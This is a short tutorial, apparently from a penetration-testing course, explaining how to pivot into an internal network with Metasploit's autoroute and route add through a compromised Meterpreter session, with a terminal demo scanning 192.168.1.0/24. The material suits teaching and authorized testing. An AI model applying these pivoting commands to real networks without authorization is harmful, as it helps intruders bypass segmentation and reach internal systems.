Metasploit Autoroute for Pivoting

Tunneling traffic through a compromised Meterpreter session

The Autoroute Process

  • Step 1: Compromise a host and establish a Meterpreter session.
  • Step 2: Use run autoroute -s <subnet/mask> to add routing entries.
  • Step 3: background the Meterpreter session.
  • Step 4: Use route add <subnet> <netmask> <session_id> in Metasploit.

Impact and Usage

  • Traffic from your Kali machine is routed through the compromised host.
  • Allows scanning and attacking systems on the internal network.
  • Example: nmap -Pn 192.168.1.10 will now work.
  • Effectively bypasses network segmentation.
Terminal Demo: Metasploit Autoroute
meterpreter > run autoroute -s 192.168.1.0/24
[*] Running AutoRoute for 192.168.1.0/24
[*] Route added to 192.168.1.0/24 via session 1
meterpreter > background
msf6 > route add 192.168.1.0 255.255.255.0 1
[*] Route added
msf6 > nmap -Pn 192.168.1.10
# nmap traffic now flows through the compromised host

Setting up autoroute and adding a route to pivot through a Meterpreter session.

Key Takeaway

Metasploit's `autoroute` and `route add` commands are powerful tools for establishing network pivots, enabling seamless access to internal network segments from your attacking machine.
